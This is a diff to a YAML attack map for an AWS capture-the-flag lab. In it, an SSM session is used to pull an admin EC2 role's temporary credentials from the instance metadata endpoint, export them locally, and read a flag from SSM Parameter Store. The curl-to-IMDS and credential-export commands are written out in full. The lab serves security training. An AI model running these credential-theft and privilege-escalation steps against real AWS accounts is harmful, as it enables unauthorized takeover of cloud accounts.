@@ -33,13 +33,20 @@ attackMap:
       label: "Admin EC2 Role"
       type: principal
       subType: iam-role
-      isTarget: true
+      isAdmin: true
       arn: "arn:aws:iam::{account_id}:role/pl-prod-ssm-001-to-admin-ec2-role"
       description: >
         This IAM role has AdministratorAccess and is attached to the EC2 instance via
         an instance profile. By retrieving its temporary credentials from the IMDS
         endpoint inside the SSM session, you gain full administrative access to the
         AWS account and can operate from your local machine.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ssm-001-to-admin"
 
   edges:
     - from: starting-principal
@@ -86,3 +93,18 @@ attackMap:
           command: "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null"
         - description: "Export the extracted credentials locally and verify admin access"
           command: "export AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> && aws iam list-users --max-items 3"
+
+    - from: target-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With the extracted administrative role credentials configured locally, read the
+        scenario CTF flag from SSM Parameter Store. AdministratorAccess grants
+        ssm:GetParameter implicitly, making this the final step to complete the challenge.
+      hints:
+        - "The flag lives in SSM Parameter Store under a predictable path: /pathfinding-labs/flags/{scenario-id}-to-admin."
+        - "Use aws ssm get-parameter with --query 'Parameter.Value' --output text to print just the flag value."
+        - "Make sure your AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN environment variables are set to the credentials you extracted from IMDS."
+      commands:
+        - description: "Read the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ssm-001-to-admin --query 'Parameter.Value' --output text"
